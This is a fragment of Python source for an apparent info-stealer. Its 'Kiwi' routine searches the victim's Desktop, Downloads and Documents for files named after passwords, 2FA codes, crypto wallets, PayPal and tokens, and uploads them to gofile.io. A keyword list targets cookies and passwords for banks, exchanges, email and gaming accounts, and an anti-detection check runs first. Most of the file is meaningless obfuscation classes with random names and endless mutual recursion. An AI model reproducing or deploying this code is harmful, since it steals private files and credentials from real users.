def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False



def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret",
        "senhas",
        "contas",
        "backup",
        "2fa",
        "importante",
        "privado",
        "exodus",
        "exposed",
        "perder",
        "amigos",
        "empresa",
        "trabalho",
        "work",
        "private",
        "source",
        "users",
        "username",
        "login",
        "user",
        "usuario",
        "log"
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",                                                          
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "mom",
        "family"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, P4sswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiCount, P4sswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] 
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = TR6st(C00k13)

if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)
class RStSMoVONUzKqc:
    def __init__(self):
        self.__tKxFNmiAcRpCMfXyzxw()
        self.__zcqnyGaYAvjDnw()
        self.__RhDjOgcIOyIWRRguq()
        self.__PPTQECVBrdAGQytlrkK()
        self.__OywlIKLsTxQycymRhnH()
        self.__phifcNhumtngqjlTVP()
        self.__XgeumGWIlM()
        self.__aceAuTFbSVCRqylg()
        self.__dqGpUfaOjuLJnn()
        self.__MsqFJKbuZJh()
        self.__YkvvdGuPSULYOrRfFQFE()
        self.__ICQrrGQwrxERT()
        self.__aZaPsJdkuPhrwPsdxhz()
    def __tKxFNmiAcRpCMfXyzxw(self, TGhcDrhBzLkJAIFeZ, sjhefulLlH, EZmAmxzMbHDVNLAxWxY, ELdakSNryYcOrqMdN, zwPWsOFspGSy):
        return self.__phifcNhumtngqjlTVP()
    def __zcqnyGaYAvjDnw(self, JDzgBGEBZ, pMphMLpMDHpZsKZIUeSz, EFMYzIwghj):
        return self.__aZaPsJdkuPhrwPsdxhz()
    def __RhDjOgcIOyIWRRguq(self, iZXYJznObEf):
        return self.__dqGpUfaOjuLJnn()
    def __PPTQECVBrdAGQytlrkK(self, czvFOyRQ, UuJiYTDgP, NrpgUBBBNthwzPV, ibtswcNWhr):
        return self.__MsqFJKbuZJh()
    def __OywlIKLsTxQycymRhnH(self, Nowozg, kpmdZhXAsE, IhzZTnbT):
        return self.__aceAuTFbSVCRqylg()
    def __phifcNhumtngqjlTVP(self, wYPpgz, Njvjl, OGlkcLOvofZAX, KdaMsFn):
        return self.__zcqnyGaYAvjDnw()
    def __XgeumGWIlM(self, vOFzOOxgfUS):
        return self.__phifcNhumtngqjlTVP()
    def __aceAuTFbSVCRqylg(self, FLYzUne, hhjytopgDQ, zBzmmozfmB, zWGdYTz, XUElxCHTuaiTqK):
        return self.__aceAuTFbSVCRqylg()
    def __dqGpUfaOjuLJnn(self, BEDflAiXpkwJ, HzEeznybDdabqKFXuOT):
        return self.__PPTQECVBrdAGQytlrkK()
    def __MsqFJKbuZJh(self, yWRPpFsMfJuLm):
        return self.__XgeumGWIlM()
    def __YkvvdGuPSULYOrRfFQFE(self, mqkytlqyNV, XBnjopxdTeSWvzYkJkt, AeYsONAhlAuezypaXkRR, yNOEtvvgVgs):
        return self.__tKxFNmiAcRpCMfXyzxw()
    def __ICQrrGQwrxERT(self, nEZWJuImMsWjhRZ, bGNnCxbjBgT, pxNcOwYmoydgaJrRVyUa, UCTSzXEi, JwzjqdIVLYokY):
        return self.__ICQrrGQwrxERT()
    def __aZaPsJdkuPhrwPsdxhz(self, jaMVmTVqXQTPHrReLyOP, CITAnMjqpWVUFAs, qLXGcw, XuwOaNVDpMhSwdxKHAP, znUtInjfs, vJUacZFAItFGk):
        return self.__RhDjOgcIOyIWRRguq()
class cWzkMgGEZwrSdSNM:
    def __init__(self):
        self.__KSHsvZZqISJN()
        self.__bubDMEBORnSChW()
        self.__ghGQlXhSfqTSudVO()
        self.__itDBsIBwxx()
        self.__VkSEgrRmPkIc()
        self.__RTEdLMUVjewpHhiK()
        self.__mWdzLOIQvJIxGRF()
        self.__WVeQCMgG()
        self.__XUMVdyMcG()
        self.__UWzqKrsfm()
        self.__wUnvHjLpajtYubvHyJHg()
    def __KSHsvZZqISJN(self, SPWxLPP, PKSVE, XYXKIMWwkDYMnA):
        return self.__wUnvHjLpajtYubvHyJHg()
    def __bubDMEBORnSChW(self, TEZUphPmhCZidDJHTY, PwqEsMQcOJEYvOPQ, QEvad, uJoxmDzNOE, azKdqDtsQiqdhUbqlSU, BargkAvFHwXYGKLGK):
        return self.__bubDMEBORnSChW()
    def __ghGQlXhSfqTSudVO(self, PIUOY, yJNJMmeo):
        return self.__UWzqKrsfm()
    def __itDBsIBwxx(self, DioodIgkan, clhNmfG, HaTPU, fxyOBCooUunsprWkQ, VbzVxUd):
        return self.__RTEdLMUVjewpHhiK()
    def __VkSEgrRmPkIc(self, hGnXvuo, NXBtmxYayfA, ADibNejpilYGlUydZMC, WCLEwupOQrCA, JzxxYeJJY, bKouICQ):
        return self.__UWzqKrsfm()
    def __RTEdLMUVjewpHhiK(self, RwdKQxEqWhRbpF, lPIfnC, JRDjhSSihFXeHtb, JHXTeLRVDBU, OlADiEfTbikcbIckBkr):
        return self.__VkSEgrRmPkIc()
    def __mWdzLOIQvJIxGRF(self, RhXksC, DMNJn, afagHQJirpEJruH, wdSdsjNbgjqfw, phaQkM, mDMgMjlnostGQoVKqjSH):
        return self.__UWzqKrsfm()
    def __WVeQCMgG(self, fMOuGFucX, QiAtKBwlQKVgHuhyzx, BZyxJRoMnwYSXkAG):
        return self.__UWzqKrsfm()
    def __XUMVdyMcG(self, NdajjTjBhIGaZbALjP, uUprasNgpBQGckRYSd, zLzjkGfltUjT):
        return self.__wUnvHjLpajtYubvHyJHg()
    def __UWzqKrsfm(self, KPOYIgo):
        return self.__ghGQlXhSfqTSudVO()
    def __wUnvHjLpajtYubvHyJHg(self, WBQNYyZhjUsBG, VSdASWXmFPLC, bhORkAcoQN, lTLTeTGsNeEbCER, JXMHtWLmDJeNYnHuPJAM, ssnlBKFxBHIjCbUNpUie, FgdTYZIkTopioo):
        return self.__ghGQlXhSfqTSudVO()
class gIJWOLncrNY:
    def __init__(self):
        self.__PaBbOcNplXOFIKgeaEQI()
        self.__cHLUwReehfZfgeYOnCb()
        self.__XkUamardkknczfehqpOw()
        self.__VHKjrQGI()
        self.__xCfeLIpsjrDroVwaz()
        self.__LsjQmMHJLkLKYVAmfBfM()
    def __PaBbOcNplXOFIKgeaEQI(self, OmVLkeDIJPa, DzSGuLRWQN, eRvqVNHM, gMubAXWlWOBUZ, iPnLuwMo, dFabSQbOtlSOBVWuMiEZ):
        return self.__XkUamardkknczfehqpOw()
    def __cHLUwReehfZfgeYOnCb(self, djQABimYFsjehJVPeSZI, PDCKLYLGotMIgCe, RIKzpQqFyGibisE, phHmnkJpdsovCnFzEO, mMAmSmwdUlqyhaKaZHd):
        return self.__XkUamardkknczfehqpOw()
    def __XkUamardkknczfehqpOw(self, wSQgmU, JUYzZFgCn, loEanjaIgdPGQmLVn, BdSWRYTk, IGyeER, CMSryvQ):
        return self.__VHKjrQGI()
    def __VHKjrQGI(self, HJWyvaYGfLUjdQZxNE, BIVbPfxVmTXQSUqhuzI, ePrjBRB, vfIaTkmXmbYFtO, nBNnCbqwKnscYC, evZAyCdieObyTUj, gsENRGMtntyHJJcUcoLg):
        return self.__VHKjrQGI()
    def __xCfeLIpsjrDroVwaz(self, muDmPACEiwAejccEA, CNhtGrrLWGd, ZwQbCttToLI, lMObku, cQzPkyTFEtFDwExI, MIEEhAJOuAEJvIIR, yHJzhPrSDTde):
        return self.__PaBbOcNplXOFIKgeaEQI()
    def __LsjQmMHJLkLKYVAmfBfM(self, SCwmLekALdzxQKiLRNDm, zXIIKYakvLnQe, UcRDPFxPqAS, juahoWpbAIp):
        return self.__XkUamardkknczfehqpOw()
class iCepfOVUdQje:
    def __init__(self):
        self.__ttEPQoPePTIdX()
        self.__AqvMXoeVDWWexn()
        self.__tOIDrejOG()
        self.__aGxgJnKlNvrLveNgc()
        self.__AZaBdJYQhywcwYtpfd()
        self.__wSvPOzjogUnoWhA()
        self.__gyQUwNXgTr()
    def __ttEPQoPePTIdX(self, XTHRHImInOYtJw):
        return self.__ttEPQoPePTIdX()
    def __AqvMXoeVDWWexn(self, TxOiiPUXGFVIICKH, aonirRHH):
        return self.__gyQUwNXgTr()
    def __tOIDrejOG(self, akkSGyVFVTC, kmMbNEAxgUML):
        return self.__gyQUwNXgTr()
    def __aGxgJnKlNvrLveNgc(self, FwMbaNlP, enblENTvVm, LXIwG, YYWsQNDl, xkUNISETBdlnWHyjFYjW):
        return self.__ttEPQoPePTIdX()
    def __AZaBdJYQhywcwYtpfd(self, ciJwlwwmWvtmmCu, WgaLeLssFDmfK):
        return self.__tOIDrejOG()
    def __wSvPOzjogUnoWhA(self, eTPkeTfGww, GrPLtBkBGREYwmnPqZf, jnOmgKSQafbM):
        return self.__gyQUwNXgTr()
    def __gyQUwNXgTr(self, gsHqwvWlIqo, tJWLILBVlWJgpK):
        return self.__AZaBdJYQhywcwYtpfd()
class ZiybQSSZ:
    def __init__(self):
        self.__SKGCrccqZ()
        self.__JgugUeDRk()
        self.__LojQasjceUMZkhE()
        self.__gcOSgWQdWocloA()
        self.__FEBnXMmEzDMm()
        self.__gfhYKweSnBYWGhBWc()
    def __SKGCrccqZ(self, wjqWXdRhhkyAqtN, XPOEoljKnvENSsdlD, hwjwvMsKgcGbcKIPCj, IGneBRu, nLSOIZAjfdrrA):
        return self.__JgugUeDRk()
    def __JgugUeDRk(self, fJPLVBqcwY, TFvHYce, tQwtNdBUkIjdQ, boiXFppvd, cuQTVyjSKAX):
        return self.__gfhYKweSnBYWGhBWc()
    def __LojQasjceUMZkhE(self, ZpWeIqQPNa, QkIXBhjAOxlJ, UHxmhRfLJ, GFlwvJRcOGZwCxJ, xPeaf, jSUHRLf):
        return self.__FEBnXMmEzDMm()
    def __gcOSgWQdWocloA(self, muCeabgVvixDlyEORE, hvyaQ, tIVqhWuXmYgywOhBZJ, rehtPNPxa, oUKfwiqsscsyX, JNbVwzDvffgbOemggHSs):
        return self.__JgugUeDRk()
    def __FEBnXMmEzDMm(self, QejjVpOpeIT, IyjZGRcGHxD):
        return self.__LojQasjceUMZkhE()
    def __gfhYKweSnBYWGhBWc(self, rzavlBjAQTOJMcql, IWzKy, zoOeeqdPBNIisNfoy, mFQHMPJBvx, HuxlcrgXOy, mqjthziT, fcRmqR):
        return self.__gfhYKweSnBYWGhBWc()

class NxxmYYbDnVEdb:
    def __init__(self):
        self.__hkIvolWcR()
        self.__tJqqLzSPuTvtLDG()
        self.__MrzVxzzYCHXTjtFdUS()
        self.__ifrTycKe()
        self.__HhaYnLneubNtypvpOG()
        self.__aGpohhNk()
        self.__TUWnnULuHr()
        self.__csqpENSz()
        self.__lLHIslIUjSEHknbkAJj()
        self.__GeaQcKmmpuxVrfSgJmvd()
        self.__zBffBBavEtCsozZawzO()
        self.__HpthbDwhSispVIf()
        self.__upOzaYgHCMXzSDeQZBC()
    def __hkIvolWcR(self, FXJwABjiNMkKt, rYOtEbZlURnBICQuv, kYGPjahMN, FYaDOBtKf, DAPUHagLRJEDoHgqOi):
        return self.__GeaQcKmmpuxVrfSgJmvd()
    def __tJqqLzSPuTvtLDG(self, WVcKolEhSlCEQLQjqrq, icjuOhbalkjNAgQPaCKA):
        return self.__zBffBBavEtCsozZawzO()
    def __MrzVxzzYCHXTjtFdUS(self, ULwWPrFELJpDqPv, ETJEykadh):
        return self.__ifrTycKe()
    def __ifrTycKe(self, PQwxzcL, SCbZussdUGXjUeli, qztRDMNHUGdIf, fqDHWhkKnZbFJMalzq, HJPEeufEHE, qKjZTrAbXbIO):
        return self.__HhaYnLneubNtypvpOG()
    def __HhaYnLneubNtypvpOG(self, dWKXcCdAjPoNDPTcVk, KvRXyiaSAdGPPJhzzxX):
        return self.__aGpohhNk()
    def __aGpohhNk(self, JylFEHFfEzAWAJnu, nCwTCUG, dlaHwqzjPzNKI, kApHmHfpRqRtJv, uDaDfYuTnUfApm, XolhUZYjmS):
        return self.__HpthbDwhSispVIf()
    def __TUWnnULuHr(self, NDUoWbH, IMuLjPUbQEkYdkVmz, mpSkbJnvpe, DKlSbSWsKFejxX, YSsVeGGSVunyRMJRCxQ, agTVGhz, brbVRuFuZjSMQV):
        return self.__ifrTycKe()
    def __csqpENSz(self, QBAtrZi, fyixdbDqIhSbhaO, prHHStdtcGLJbWXfGMc):
        return self.__aGpohhNk()
    def __lLHIslIUjSEHknbkAJj(self, rCKKIseAurhY, ToExiSqVciBMUTEMVoIh, KKJtfVdhVqgdZqnbXVDJ, MTpUrqkYcoMg, iMrbZfzkqpYySWMi, uNHHAHxXSoWedttmFW, lbCTpQomqIKCTFtBWrs):
        return self.__aGpohhNk()
    def __GeaQcKmmpuxVrfSgJmvd(self, yBhgQfg):
        return self.__aGpohhNk()
    def __zBffBBavEtCsozZawzO(self, YsdlBijrUnoqn, DalqdBMvzigRUoo, FAklpJi, ZSzsuHBn, ZJGkFCdBdZggF, VabUctxEvSQXQxRJvZt):
        return self.__TUWnnULuHr()
    def __HpthbDwhSispVIf(self, gAKXrhcRuNUbBYDMcSjV, HoGnlopDzycrMLBV, yLmxHllqDh):
        return self.__lLHIslIUjSEHknbkAJj()
    def __upOzaYgHCMXzSDeQZBC(self, eogKchwWKi, xuVZTqfV, FIlVjLkWqAuoMSsswY, URUzYXhNluQrLmDzDWw):
        return self.__zBffBBavEtCsozZawzO()
class iJMdnVCHdy:
    def __init__(self):
        self.__ztuxjvOSSnkGaZvPREg()
        self.__LrwbqxMlams()
        self.__BpmpshrVEIhj()
        self.__xfGTdyDZJXUxAMstph()
        self.__RdUhsPGweWCXDY()
        self.__acTUdkOSALnbMckX()
        self.__HVXUEkRfWBqM()
        self.__aFtnWhVhC()
    def __ztuxjvOSSnkGaZvPREg(self, paHOPyxzfjpLeXH, eTZaFHQrRMR, JjmMzJyyhXgUL):
        return self.__HVXUEkRfWBqM()
    def __LrwbqxMlams(self, MnEiiVgCdSXsMguQn, pVMNvfaJcObX, uETRAkAPLWlkGidBGu, oDwuZXZGmqanTYL, xHtDyxTshpbJeXWiDVP, nRshzurHkl):
        return self.__BpmpshrVEIhj()
    def __BpmpshrVEIhj(self, HhYvsSilA, mBSMn, oXTHUUSdrNI, LEeiVqyetXolkGipuXxF):
        return self.__HVXUEkRfWBqM()
    def __xfGTdyDZJXUxAMstph(self, ABemIkdTEACp, uVdejlv, CMnJHwCWkBXKTY, vErvZNzbhUAWJMBkQx, DctOlpoTnwbymugSfhGL, wrSXemVsNGuZO):
        return self.__BpmpshrVEIhj()
    def __RdUhsPGweWCXDY(self, aVEioF, ZuyXb, EPEZuLJ):
        return self.__LrwbqxMlams()
    def __acTUdkOSALnbMckX(self, vTEKsJLyzzFsDTaIHYn):
        return self.__LrwbqxMlams()
    def __HVXUEkRfWBqM(self, dATzSwOIZuHgHzw, TgRmZHyovGpbQifVSZWF, KdpAreHuR, lyWzxOGaPlVAtRtn, ebxnIYpBrqRd):
        return self.__acTUdkOSALnbMckX()
    def __aFtnWhVhC(self, oeuYsgOzEiomeCURRsKk, CZvBXpgParKGaZUGGxa, hBfwRUP, RKzbKCuSLPbiRsAaF, LvogQUmpF):
        return self.__acTUdkOSALnbMckX()

class iwysEIIjcOr:
    def __init__(self):
        self.__GwzUQlOevoKfgiySviw()
        self.__NrVUsBOPHwauDFQkYNOa()
        self.__HkahhZdc()
        self.__QfcuivmRQXnCxGgPsaD()
        self.__IscMUFberJuwSQIh()
        self.__JSVeKlOBuLzZZeJIMV()
        self.__bqfBYAfpVUZuBEzhcCao()
        self.__KSZgNXSYVGKUeIemlV()
        self.__SGgHWUTwnJNsbk()
        self.__IhnmCBXtjJcZeMan()
        self.__NdFAjpMWPvnYcEKogYZ()
        self.__KMXchvErxbfHvjqRfzzY()
    def __GwzUQlOevoKfgiySviw(self, SOFZtQidKQaLNvd, ajKPTzSwkRJRQbrfvqyG):
        return self.__SGgHWUTwnJNsbk()
    def __NrVUsBOPHwauDFQkYNOa(self, pAfUMDytyJYsRN, gexkmsOvXnGwxyFhbsvm, UzcHgz, dOEAFlUFAbvMYBqycPyC, txPatMY):
        return self.__JSVeKlOBuLzZZeJIMV()
    def __HkahhZdc(self, xBivgCMteXbGOfWXx):
        return self.__KMXchvErxbfHvjqRfzzY()
    def __QfcuivmRQXnCxGgPsaD(self, oOlDJrE, eclGEYPTjccX, ksxPfx, NkUlaAEDZymtJYDTSSg, MqwbGTVjms, TSIlXrLHAIajECpB, qzdaR):
        return self.__NdFAjpMWPvnYcEKogYZ()
    def __IscMUFberJuwSQIh(self, yJofTbkyKJgptNukV, bSSGTv):
        return self.__KMXchvErxbfHvjqRfzzY()
    def __JSVeKlOBuLzZZeJIMV(self, idRdKTBdNmdCt, lijNZxF, ibXuTLpSZWQCO, VMASEXNqSnRj, plMWIKEHGRd, QrZtUrHsLBVqg):
        return self.__KMXchvErxbfHvjqRfzzY()
    def __bqfBYAfpVUZuBEzhcCao(self, jHlhZUXuSWQxLslOaZHa):
        return self.__KSZgNXSYVGKUeIemlV()
    def __KSZgNXSYVGKUeIemlV(self, RFDza, mOfTTRdBKWz, CPClBnj):
        return self.__HkahhZdc()
    def __SGgHWUTwnJNsbk(self, TJZlTcgJIOQZZVqZit, htcBuRIbAnHVi, IaNEeJb, uyymYHehEbBmigmrKc, ZHZIrVngdAkiVS, UzkXXUTZTEibFqHFldu):
        return self.__KMXchvErxbfHvjqRfzzY()
    def __IhnmCBXtjJcZeMan(self, XBXpU, zPGbPQcME, pzzxaUXcMBZyCKNZIie):
        return self.__KSZgNXSYVGKUeIemlV()
    def __NdFAjpMWPvnYcEKogYZ(self, WxfRKMLPWaTbT, WIzKQPtxTwDSaDHVRHQP):
        return self.__KMXchvErxbfHvjqRfzzY()
    def __KMXchvErxbfHvjqRfzzY(self, zWmZG, EtOjWCdjkmU, qWnIEQlMZVhSWmGLg, LdtjRCLMnxfXOsTtkCyc, gZQfcYAAdoBRypo):
        return self.__GwzUQlOevoKfgiySviw()
class lMgFnZEpMC:
    def __init__(self):
        self.__NOJRentGMdHporKB()
        self.__CuqoqIKQWg()
        self.__eQCMnaArAe()
        self.__KvPqouyVcsg()
        self.__yQvYLYfJTfVlWYBDCd()
        self.__wwGNYrKOngu()
        self.__hRBHXiyvh()
        self.__DaUotSHfwL()
        self.__kGOdNYnRRqiPBobWUpl()
        self.__ffmCGpmuHGXsVbeuJ()
        self.__WxGTUQTqBJpUGVpxoQZx()
        self.__DtuqTJVzdsRjRLu()
        self.__BaBFBkhmxxTipJXESzhA()
        self.__JGZSScuDUwOkYdKEy()
    def __NOJRentGMdHporKB(self, rNCoZXfsDXI, lrZNGirXMsPEW, BGGBhQBLLbkeLJeAD, HmuBpoTknmNKUBI, XqCPtciEmvjUKByXI, XmYUS):
        return self.__ffmCGpmuHGXsVbeuJ()
    def __CuqoqIKQWg(self, wPFuaGUCZGwoq, VUhTiyCYris, QSfRwTPgEQPSR, jmwjOsTbZf, zNJdwpRsUnGwCXBX, gqVgdA):
        return self.__BaBFBkhmxxTipJXESzhA()
    def __eQCMnaArAe(self, POedgKPkWbM):
        return self.__KvPqouyVcsg()
    def __KvPqouyVcsg(self, HRxKmHnsWtMPFNMoRS, FvxkSmj, lQTxmoDoBSV, oePBBRtqb, NLCbcZQw, wFKFAAwq):
        return self.__JGZSScuDUwOkYdKEy()
    def __yQvYLYfJTfVlWYBDCd(self, cPaSdvSHbFona, yqqSxsOWPVFJgjnFTR, bbpqNJsya, JNfTveLjmkjtkp):
        return self.__ffmCGpmuHGXsVbeuJ()
    def __wwGNYrKOngu(self, xGKJrfU, VdWyAxMnyNrWJQTbtEez, nLBxBchRBpEBCha, OKQboQIjXMkofLfdghde, bAgFm):
        return self.__wwGNYrKOngu()
    def __hRBHXiyvh(self, CevYKlZZEZTHYaZYc, pntIztpYMwwAJEJD, WkQrUunmwFNupm):
        return self.__NOJRentGMdHporKB()
    def __DaUotSHfwL(self, twnyvTOT, mSwgrZxvsxjrVdHjWgBA, LufEf, bssoUdzNkdXGO):
        return self.__eQCMnaArAe()
    def __kGOdNYnRRqiPBobWUpl(self, xZtZW):
        return self.__WxGTUQTqBJpUGVpxoQZx()
    def __ffmCGpmuHGXsVbeuJ(self, TxTiQrZoHJJUAI, ebhPJXZXiKEb, MiMsZYrUbrtyaldVKNR, DkTxrYgVsdCkuy, GIYoaulYF, QlnsAUDPIjOXdjLvyalt, eOlTHw):
        return self.__NOJRentGMdHporKB()
    def __WxGTUQTqBJpUGVpxoQZx(self, SFcxhthAiK):
        return self.__CuqoqIKQWg()
    def __DtuqTJVzdsRjRLu(self, eoRswxDTXUMkcJI, LlFMYlsMPCAjvO, YpFxXrOAfJz, dDboBbwsLEmqUErsNiRQ, yMYtBWobKOSphCbf):
        return self.__JGZSScuDUwOkYdKEy()
    def __BaBFBkhmxxTipJXESzhA(self, WAtIbrqrV, OXBnuEYl, kqASvKxJLajAinDeuY, UtGyFWVBRlmiufu, MMFtZjRDKkO, lRxVEtKCyfGnDYiXKa):
        return self.__WxGTUQTqBJpUGVpxoQZx()
    def __JGZSScuDUwOkYdKEy(self, rfrYDfTQB, ReUOetVfVngFlZaz):
        return self.__wwGNYrKOngu()
class YjAlwVKnvCmYxGkizgrO:
    def __init__(self):
        self.__AyOUuZZYNzpO()
        self.__cZdHySqYhBtcNLG()
        self.__yGXiRwaw()
        self.__MEUkVrFAW()
        self.__mXiZVuEs()
        self.__vkzmCQykUIwXwIkD()
    def __AyOUuZZYNzpO(self, TIIPJKceuPnf):
        return self.__cZdHySqYhBtcNLG()
    def __cZdHySqYhBtcNLG(self, cCaFycF):
        return self.__AyOUuZZYNzpO()
    def __yGXiRwaw(self, MIcdSqZXyRVSj, GYIpg, mVsjcZqx, TdDux, XhkTvJbjOxe):
        return self.__cZdHySqYhBtcNLG()
    def __MEUkVrFAW(self, ethuGIY, HWWQxMyHQQhzNTXMQ, EkMbQPslbN, rFUCJ, WmVgpnRutfywvF, cDRwtYzLtIWw):
        return self.__cZdHySqYhBtcNLG()
    def __mXiZVuEs(self, XgiXwiECWzlFDHCj, PaLQDd, ThBsDFgMOD, kDLZnFjaZ, KHWMdDsnGPkbN, aTufhCnXRSrtnULn):
        return self.__mXiZVuEs()
    def __vkzmCQykUIwXwIkD(self, MastDWTPyrbdE, fubYMyUPj, FCXDfJPDYmO, zvFeW, taDOxLFBgOmRDkO):
        return self.__mXiZVuEs()

class rDcXjDQXQWPsjf:
    def __init__(self):
        self.__ZclOtzEIdOcJzn()
        self.__SOqvEWyNjMDIZ()
        self.__EgBkUCXusI()
        self.__skeFvjvzslTXIxbQC()
        self.__KfsdJkNZTNlhP()
        self.__SAYsrvmnk()
        self.__aEfYarHJDzSyFStRi()
        self.__jDPveqvUUlAtQBeAc()
        self.__mtdUCnByfFn()
        self.__xmpeepWgrbgNKnvDTYN()
        self.__nqiULDWroiBVMfH()
        self.__UdSYsANBvrdhyTGIyXSZ()
        self.__hfBGxhavuhEHzymzwS()
        self.__duawBTjjmivcb()
        self.__TXOWwoZKOiAjsKOvFUnd()
    def __ZclOtzEIdOcJzn(self, XLUnxxMBiYWOBClKkZcw, RWfnjfWKPLEtHrbySnU, zXQuLuQEzKptLmCU):
        return self.__EgBkUCXusI()
    def __SOqvEWyNjMDIZ(self, zbGTdoCRmoJeWzXZ, lYISgxirAFmjaZo):
        return self.__mtdUCnByfFn()
    def __EgBkUCXusI(self, zjriGsxOaNDX, QiBDGMOUMsB, fBcRzs):
        return self.__TXOWwoZKOiAjsKOvFUnd()
    def __skeFvjvzslTXIxbQC(self, TqIEdOihdaMafa, GpHbwOiJKclQR, gQZMtRFxxVT, qnaMlRWSijcyGdKigAzb, tHfpNwZX, KXXQrBGubyBFRLbINy):
        return self.__EgBkUCXusI()
    def __KfsdJkNZTNlhP(self, uxObZvKIJLSmVdnNoQWE, pDhbS, zohjVWlwZkVkkejDaQ, BsTgA):
        return self.__aEfYarHJDzSyFStRi()
    def __SAYsrvmnk(self, PednRguzVlYfkGsKMK, dOuKo, JWFPnDoZ, wYtsaJvEE, varRpWCtZemGUUv, IJlFJHq, jUTpFGPImNNDbmEwW):
        return self.__aEfYarHJDzSyFStRi()
    def __aEfYarHJDzSyFStRi(self, BdiQZG):
        return self.__KfsdJkNZTNlhP()
    def __jDPveqvUUlAtQBeAc(self, zgbQSvzJNy, vMNeJIHVRx, lDBdrEphbqEfsv, egyvHzFRPJXpEbsCyg):
        return self.__SOqvEWyNjMDIZ()
    def __mtdUCnByfFn(self, xELHdWYQVKNddoqgwI, VulgFVWsF, pKWZLsvvie, PUFvAQYl, LPXdSOVWsnMjSVBJGmq, PnKwefLTbiEC, VcAsrKX):
        return self.__SOqvEWyNjMDIZ()
    def __xmpeepWgrbgNKnvDTYN(self, PNRxRGkVmfR, PtCLNAhtMRQiGNT, jHFLeAJPepYWYroBmsl, xvMLieFKeSxRvitbpCfy, StZaBjIndJWhpNGmOxiN):
        return self.__skeFvjvzslTXIxbQC()
    def __nqiULDWroiBVMfH(self, qGdyBSzmeiSY, OkzZyi, kLODPQkiqAV, aZHqpuiDha, shJxWYPAtkQahCikg, cpHNEjpstqlkELsenxqj, kytwaUPNTOoIWXaoKij):
        return self.__nqiULDWroiBVMfH()
    def __UdSYsANBvrdhyTGIyXSZ(self, BxLeqoBNRlDWXe, NczEZUTGGXVlDIdaZr, cnKKUJoVrrjwqAc, QoMyYpiFrlNYnHV):
        return self.__hfBGxhavuhEHzymzwS()
    def __hfBGxhavuhEHzymzwS(self, wCqelGERcYCW, PsINnNAwNquvRyWEGe, ZhpInPMocEPa):
        return self.__nqiULDWroiBVMfH()
    def __duawBTjjmivcb(self, BZwcGQaL, cGXzQRtyDej, qACzE, beSqJtcQpGvzCutru, FBhOPWrBDKXDUSa, RUUywVuecEuqHS):
        return self.__UdSYsANBvrdhyTGIyXSZ()
    def __TXOWwoZKOiAjsKOvFUnd(self, gpDbQRfCWY):
        return self.__UdSYsANBvrdhyTGIyXSZ()
class DTkRrDwVxOtQyXfRgacf:
    def __init__(self):
        self.__qjXoYcHqvLbXDTcLO()
        self.__kvbjdmMpgAmXJQ()
        self.__TBRQTQlCkFEntDk()
        self.__tOgrZJFz()
        self.__hLJOSNRbpI()
        self.__eXDoIJMpqVxbC()
        self.__JqDFxLbOjHsEHL()
        self.__cagyoxDcMd()
        self.__iYNisSRxKMDIlv()
        self.__metyhQAhBGPjTy()
        self.__wOKOHDSDh()
        self.__UBZQAOBRPZ()
        self.__BObPclIEOoIdnOvvD()
